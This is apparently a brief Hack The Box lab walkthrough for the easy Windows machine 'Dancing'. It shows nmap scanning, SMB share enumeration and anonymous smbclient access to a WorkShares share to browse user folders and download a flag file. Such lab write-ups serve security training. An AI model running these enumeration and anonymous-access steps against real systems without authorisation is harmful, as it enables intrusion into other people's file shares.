# 💃 Hack The Box – Dancing Walkthrough

> Status: Completed ✅  
> Difficulty: Easy  
> OS: Windows  
> Points: 20

---
## 🧰 Tools Used
Nmap
smbclient
Kali Linux

## 🔎 Nmap Enumeration

```bash
nmap -sCV 10.10.xx.xx
Port 445: SMB open
Port 135: RPC

🛠️ SMB Enumeration
smbclient -L \\\\10.10.xx.xx\\
Anonymous login enabled
Found share: WorkShares

💥 Exploit (if any)
Used credentials found to log in or access flag path.
smbclient \\\\10.10.xx.xx\\WorkShares -N
Download files:
ls
cd Amy.J
ls
cd ..
cd James.P
ls
get flag.txt


